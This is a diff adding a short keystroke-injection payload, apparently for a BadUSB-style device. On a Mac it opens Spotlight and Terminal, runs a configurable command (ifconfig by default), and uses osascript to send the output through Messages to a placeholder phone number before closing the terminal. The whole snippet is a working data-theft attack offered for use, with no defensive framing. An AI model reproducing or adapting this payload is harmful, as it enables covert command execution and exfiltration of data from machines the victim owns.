@@ -1,0 +1,12 @@
+#CONFIG
+exfil_target = "+15555555555"
+exfil_command = "ifconfig"
+
+#Spotlight
+payload1 = [usb.SPOTLIGHT]
+payload2 = usb.get_sequence('terminal')
+payload2 += [usb.ENTER]
+payload3 = usb.get_sequence(f'osascript -e "tell application \\"Messages\\" to send \\"`{exfil_command}`\\" to participant \\"{exfil_target}\\""')
+payload3 += [usb.ENTER]
+payload4 = usb.get_sequence('exit')
+payload4 += [usb.ENTER]
